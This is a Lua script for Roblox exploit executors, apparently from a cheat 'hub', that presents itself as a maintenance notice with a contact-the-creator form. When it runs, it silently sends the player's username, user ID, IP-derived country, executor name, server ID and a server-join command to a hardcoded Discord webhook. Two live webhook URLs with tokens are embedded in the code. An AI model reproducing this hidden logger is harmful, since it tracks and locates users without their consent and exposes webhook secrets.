local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

-- CONFIGURACIÓN - WEBHOOKS DIFERENTES
local WEBHOOK_EXECUTOR = "https://discord.com/api/webhooks/1544648762306338818/T1OrGu88pGdjioO1yYuvd-pqXwbra9co144FdIBz9Youhxtm7n0Ve4IQKSeRau0ZRlhU" -- Webhook para cuando alguien ejecuta el script (mantenimiento)
local WEBHOOK_MENSAJES = "https://discord.com/api/webhooks/1545842548260606182/DcONyS1VnhOVdVy76dnNExfQVyZJayMLkBNXCxNs31NMwLwsiCGdjq2ErKSlSI3RaYm2" -- Webhook para los mensajes al creador

-- ============================================
-- SISTEMA 1: DETECCIÓN DE EJECUTOR (MANTENIMIENTO)
-- ============================================
local logged = false

local function detectExecutor()
    local executorName = "Desconocido"
    
    pcall(function()
        if identifyexecutor then
            local name, version = identifyexecutor()
            if name then
                executorName = tostring(name)
                if version then
                    executorName = executorName .. ' - ' .. tostring(version)
                end
                return executorName
            end
        end
    end)
    
    pcall(function()
        if syn and syn.version then
            executorName = "Synapse X - " .. syn.version
        elseif krnl and krnl.version then
            executorName = "Krnl - " .. krnl.version
        elseif script and script.Name and script.Name == "Solara" then
            executorName = "Solara"
        elseif _G and _G.ExecutionIdentity then
            executorName = _G.ExecutionIdentity
        elseif getexecutorname then
            local name = getexecutorname()
            if name and name ~= "" then
                executorName = name
            end
        end
    end)
    
    return executorName
end

local function sendExecutorLog()
    if logged then return end
    logged = true

    if WEBHOOK_EXECUTOR == "" then
        warn("WEBHOOK_EXECUTOR no configurado")
        return
    end

    local playerName = player.Name
    local displayName = player.DisplayName
    local userId = player.UserId
    local jobId = game.JobId
    local placeId = game.PlaceId
    local serverTime = os.time()
    local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)

    local country = "Desconocido"
    pcall(function()
        local ipResponse = HttpService:JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=status,country'))
        if ipResponse.status == "success" and ipResponse.country then
            country = ipResponse.country
        end
    end)

    local executor = detectExecutor()

    local avatarUrl = ""
    pcall(function()
        local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
        local avatarData = HttpService:JSONDecode(game:HttpGet(avatarRequest))
        if avatarData and avatarData.data and avatarData.data[1] then
            avatarUrl = avatarData.data[1].imageUrl
        end
    end)

    local mapName = "Desconocido"
    pcall(function()
        mapName = game:GetService('MarketplaceService'):GetProductInfo(placeId).Name
    end)

    local data = {
        ["content"] = "🚫 **¡Intento de ejecución en mantenimiento!**",
        ["embeds"] = {{
            ["title"] = "👤 Información del usuario",
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "📛 Nombre",
                    ["value"] = displayName .. " (@ " .. playerName .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 User ID",
                    ["value"] = tostring(userId),
                    ["inline"] = true
                },
                {
                    ["name"] = "🗺️ Mapa",
                    ["value"] = mapName,
                    ["inline"] = true
                },
                {
                    ["name"] = "🖥️ Ejecutor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "🌍 País",
                    ["value"] = country,
                    ["inline"] = true
                },
                {
                    ["name"] = "🕐 Fecha/Hora",
                    ["value"] = date,
                    ["inline"] = true
                },
                {
                    ["name"] = "🔑 Server ID",
                    ["value"] = "`" .. jobId .. "`",
                    ["inline"] = false
                },
                {
                    ["name"] = "📌 Comando para unirte",
                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Irvinglz1 Hub - Modo Mantenimiento"
            },
            ["timestamp"] = DateTime.now():ToIsoDate(),
            ["thumbnail"] = {
                ["url"] = avatarUrl
            }
        }}
    }

    local encodedData = HttpService:JSONEncode(data)
    pcall(function()
        local success = false
        
        if syn and syn.request then
            local response = syn.request({
                Url = WEBHOOK_EXECUTOR,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success and http and http.request then
            local response = http.request({
                Url = WEBHOOK_EXECUTOR,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success and request then
            local response = request({
                Url = WEBHOOK_EXECUTOR,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success then
            HttpService:PostAsync(WEBHOOK_EXECUTOR, encodedData, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- ============================================
-- SISTEMA 2: MENSAJES AL CREADOR
-- ============================================
local function sendMessageToCreator(messageText)
    if WEBHOOK_MENSAJES == "" then
        warn("WEBHOOK_MENSAJES no configurado")
        return
    end
    
    local playerName = player.Name
    local displayName = player.DisplayName
    local userId = player.UserId
    local date = os.date("%Y-%m-%d %H:%M:%S", os.time())
    
    local avatarUrl = ""
    pcall(function()
        local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
        local avatarData = HttpService:JSONDecode(game:HttpGet(avatarRequest))
        if avatarData and avatarData.data and avatarData.data[1] then
            avatarUrl = avatarData.data[1].imageUrl
        end
    end)
    
    local data = {
        ["content"] = "💬 **¡Nuevo mensaje para el creador!**",
        ["embeds"] = {{
            ["title"] = "📩 Mensaje de " .. displayName,
            ["color"] = 16776960,
            ["fields"] = {
                {
                    ["name"] = "👤 Usuario",
                    ["value"] = displayName .. " (@ " .. playerName .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 User ID",
                    ["value"] = tostring(userId),
                    ["inline"] = true
                },
                {
                    ["name"] = "💬 Mensaje",
                    ["value"] = messageText,
                    ["inline"] = false
                },
                {
                    ["name"] = "🕐 Fecha/Hora",
                    ["value"] = date,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Sistema de Mensajes al Creador"
            },
            ["timestamp"] = DateTime.now():ToIsoDate(),
            ["thumbnail"] = {
                ["url"] = avatarUrl
            }
        }}
    }
    
    local encodedData = HttpService:JSONEncode(data)
    pcall(function()
        local success = false
        
        if syn and syn.request then
            local response = syn.request({
                Url = WEBHOOK_MENSAJES,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success and http and http.request then
            local response = http.request({
                Url = WEBHOOK_MENSAJES,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success and request then
            local response = request({
                Url = WEBHOOK_MENSAJES,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end
        
        if not success then
            HttpService:PostAsync(WEBHOOK_MENSAJES, encodedData, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- ============================================
-- GUI PRINCIPAL - MANTENIMIENTO + BOTÓN MENSAJES
-- ============================================
local function ShowMaintenanceScreen()
    local gui = Instance.new("ScreenGui")
    gui.Name = "MaintenanceScreen"
    gui.Parent = game:GetService("CoreGui")
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(10,10,10)
    bg.BackgroundTransparency = 1

    local textLabel = Instance.new("TextLabel", bg)
    textLabel.Size = UDim2.new(1,0,0,150)
    textLabel.Position = UDim2.new(0,0,0.4,-75)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255,255,255)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextSize = 45
    textLabel.TextTransparency = 1
    textLabel.Text = ""
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Center

    -- Animación de entrada
    TweenService:Create(bg, TweenInfo.new(1), {
        BackgroundTransparency = 0
    }):Play()

    TweenService:Create(textLabel, TweenInfo.new(1), {
        TextTransparency = 0
    }):Play()

    -- Escribir mensaje
    local message = "No se cuanto tiempo estara en mantenimiento pero lo siento"
    for i = 1, #message do
        textLabel.Text = string.sub(message, 1, i)
        task.wait(0.06)
    end

    task.wait(1.5)

    -- Contenedor para el botón
    local buttonContainer = Instance.new("Frame", bg)
    buttonContainer.Size = UDim2.new(0, 300, 0, 60)
    buttonContainer.Position = UDim2.new(0.5, -150, 0.5, 40)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Visible = false
    
    -- Botón "Enviar mensaje al creador"
    local creatorButton = Instance.new("TextButton", buttonContainer)
    creatorButton.Size = UDim2.new(1, 0, 1, 0)
    creatorButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    creatorButton.Text = "💬 Enviar mensaje al creador"
    creatorButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    creatorButton.TextSize = 18
    creatorButton.Font = Enum.Font.GothamBold
    creatorButton.BorderSizePixel = 0
    creatorButton.ZIndex = 2
    
    -- Sombra del botón
    local shadow = Instance.new("Frame", creatorButton)
    shadow.Size = UDim2.new(1, 2, 1, 2)
    shadow.Position = UDim2.new(0, -1, 0, -1)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.5
    shadow.BorderSizePixel = 0
    
    -- Texto adicional
    local subText = Instance.new("TextLabel", bg)
    subText.Size = UDim2.new(1,0,0,40)
    subText.Position = UDim2.new(0,0,0.6,0)
    subText.BackgroundTransparency = 1
    subText.Text = "Haz clic aquí para contactar al creador"
    subText.TextColor3 = Color3.fromRGB(200, 200, 200)
    subText.TextSize = 16
    subText.Font = Enum.Font.Gotham
    subText.TextTransparency = 1
    subText.TextWrapped = true
    subText.TextXAlignment = Enum.TextXAlignment.Center

    -- Efecto hover del botón
    creatorButton.MouseEnter:Connect(function()
        TweenService:Create(creatorButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        }):Play()
    end)
    
    creatorButton.MouseLeave:Connect(function()
        TweenService:Create(creatorButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        }):Play()
    end)

    -- ============================================
    -- VENTANA PARA ESCRIBIR MENSAJE
    -- ============================================
    local function showMessageWindow()
        local msgGui = Instance.new("ScreenGui")
        msgGui.Name = "MessageWindow"
        msgGui.Parent = game:GetService("CoreGui")
        msgGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        local msgFrame = Instance.new("Frame", msgGui)
        msgFrame.Size = UDim2.new(0, 500, 0, 400)
        msgFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
        msgFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        msgFrame.BackgroundTransparency = 0.9
        msgFrame.BorderSizePixel = 0
        msgFrame.ClipsDescendants = true
        
        -- Sombra
        local shadow2 = Instance.new("Frame", msgFrame)
        shadow2.Size = UDim2.new(1, 2, 1, 2)
        shadow2.Position = UDim2.new(0, -1, 0, -1)
        shadow2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        shadow2.BackgroundTransparency = 0.5
        shadow2.BorderSizePixel = 0
        
        -- Título
        local title2 = Instance.new("TextLabel", msgFrame)
        title2.Size = UDim2.new(1, 0, 0, 60)
        title2.Position = UDim2.new(0, 0, 0, 0)
        title2.BackgroundTransparency = 1
        title2.Text = "💬 Mensaje para el creador"
        title2.TextColor3 = Color3.fromRGB(255, 255, 255)
        title2.TextSize = 28
        title2.Font = Enum.Font.GothamBold
        
        -- Subtítulo
        local subtitle = Instance.new("TextLabel", msgFrame)
        subtitle.Size = UDim2.new(1, -40, 0, 30)
        subtitle.Position = UDim2.new(0, 20, 0, 60)
        subtitle.BackgroundTransparency = 1
        subtitle.Text = "Escribe tu mensaje (máximo 500 caracteres)"
        subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
        subtitle.TextSize = 14
        subtitle.Font = Enum.Font.Gotham
        subtitle.TextXAlignment = Enum.TextXAlignment.Left
        
        -- Cuadro de texto
        local textBoxFrame2 = Instance.new("Frame", msgFrame)
        textBoxFrame2.Size = UDim2.new(1, -40, 0, 180)
        textBoxFrame2.Position = UDim2.new(0, 20, 0, 95)
        textBoxFrame2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        textBoxFrame2.BorderSizePixel = 1
        textBoxFrame2.BorderColor3 = Color3.fromRGB(80, 80, 80)
        
        local textBox2 = Instance.new("TextBox", textBoxFrame2)
        textBox2.Size = UDim2.new(1, -10, 1, -10)
        textBox2.Position = UDim2.new(0, 5, 0, 5)
        textBox2.BackgroundTransparency = 1
        textBox2.Text = ""
        textBox2.TextColor3 = Color3.fromRGB(255, 255, 255)
        textBox2.TextSize = 16
        textBox2.Font = Enum.Font.Gotham
        textBox2.TextWrapped = true
        textBox2.TextXAlignment = Enum.TextXAlignment.Left
        textBox2.TextYAlignment = Enum.TextYAlignment.Top
        textBox2.PlaceholderText = "Escribe tu mensaje aquí..."
        textBox2.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
        
        -- Contador de caracteres
        local charCount2 = Instance.new("TextLabel", msgFrame)
        charCount2.Size = UDim2.new(1, -40, 0, 25)
        charCount2.Position = UDim2.new(0, 20, 0, 280)
        charCount2.BackgroundTransparency = 1
        charCount2.Text = "0/500"
        charCount2.TextColor3 = Color3.fromRGB(150, 150, 150)
        charCount2.TextSize = 12
        charCount2.Font = Enum.Font.Gotham
        charCount2.TextXAlignment = Enum.TextXAlignment.Right
        
        textBox2.Changed:Connect(function(property)
            if property == "Text" then
                local length = #textBox2.Text
                charCount2.Text = length .. "/500"
                if length > 500 then
                    textBox2.Text = string.sub(textBox2.Text, 1, 500)
                    charCount2.Text = "500/500"
                end
            end
        end)
        
        -- Botón enviar
        local sendBtn = Instance.new("TextButton", msgFrame)
        sendBtn.Size = UDim2.new(0, 200, 0, 45)
        sendBtn.Position = UDim2.new(0.5, -100, 0, 325)
        sendBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        sendBtn.Text = "📤 Enviar mensaje"
        sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        sendBtn.TextSize = 18
        sendBtn.Font = Enum.Font.GothamBold
        sendBtn.BorderSizePixel = 0
        
        -- Botón cerrar
        local closeBtn2 = Instance.new("TextButton", msgFrame)
        closeBtn2.Size = UDim2.new(0, 30, 0, 30)
        closeBtn2.Position = UDim2.new(1, -35, 0, 5)
        closeBtn2.BackgroundTransparency = 1
        closeBtn2.Text = "✕"
        closeBtn2.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn2.TextSize = 20
        closeBtn2.Font = Enum.Font.GothamBold
        
        closeBtn2.MouseButton1Click:Connect(function()
            msgGui:Destroy()
        end)
        
        -- Arrastrar ventana
        local dragging = false
        local dragStart, startPos
        
        msgFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = msgFrame.Position
            end
        end)
        
        msgFrame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
        
        UserInputService.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input.Position - dragStart
                msgFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        
        -- Función enviar
        sendBtn.MouseButton1Click:Connect(function()
            local messageText = textBox2.Text
            if messageText == "" or messageText == "Escribe tu mensaje aquí..." then
                local errorLabel = Instance.new("TextLabel", msgFrame)
                errorLabel.Size = UDim2.new(1, -40, 0, 30)
                errorLabel.Position = UDim2.new(0, 20, 0, 380)
                errorLabel.BackgroundTransparency = 1
                errorLabel.Text = "❌ Por favor escribe un mensaje"
                errorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
                errorLabel.TextSize = 14
                errorLabel.Font = Enum.Font.Gotham
                task.wait(3)
                errorLabel:Destroy()
                return
            end
            
            sendMessageToCreator(messageText)
            
            local successLabel = Instance.new("TextLabel", msgFrame)
            successLabel.Size = UDim2.new(1, -40, 0, 30)
            successLabel.Position = UDim2.new(0, 20, 0, 380)
            successLabel.BackgroundTransparency = 1
            successLabel.Text = "✅ ¡Mensaje enviado con éxito!"
            successLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            successLabel.TextSize = 14
            successLabel.Font = Enum.Font.Gotham
            
            task.wait(2)
            msgGui:Destroy()
        end)
        
        -- Animación entrada
        msgFrame.BackgroundTransparency = 1
        msgFrame.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(msgFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundTransparency = 0.9,
            Size = UDim2.new(0, 500, 0, 400)
        }):Play()
    end

    creatorButton.MouseButton1Click:Connect(function()
        showMessageWindow()
    end)

    -- Mostrar el botón después de un momento
    task.wait(0.5)
    buttonContainer.Visible = true
    
    -- Animación del botón
    buttonContainer.Position = UDim2.new(0.5, -150, 0.6, 40)
    buttonContainer.Size = UDim2.new(0, 0, 0, 0)
    TweenService:Create(buttonContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -150, 0.5, 40),
        Size = UDim2.new(0, 300, 0, 60)
    }):Play()
    
    TweenService:Create(subText, TweenInfo.new(0.6), {
        TextTransparency = 0
    }):Play()

    -- Función para cerrar todo
    local function closeAll()
        TweenService:Create(bg, TweenInfo.new(1.5), {
            BackgroundTransparency = 1
        }):Play()
        
        TweenService:Create(textLabel, TweenInfo.new(1.5), {
            TextTransparency = 1
        }):Play()
        
        TweenService:Create(subText, TweenInfo.new(1.5), {
            TextTransparency = 1
        }):Play()
        
        TweenService:Create(buttonContainer, TweenInfo.new(1.5), {
            Size = UDim2.new(0, 0, 0, 0)
        }):Play()
        
        task.wait(1.5)
        gui:Destroy()
    end
end

-- ============================================
-- EJECUCIÓN PRINCIPAL
-- ============================================
task.spawn(function()
    task.wait(1)
    sendExecutorLog() -- Envía el log al webhook de ejecutores
    ShowMaintenanceScreen() 
end)
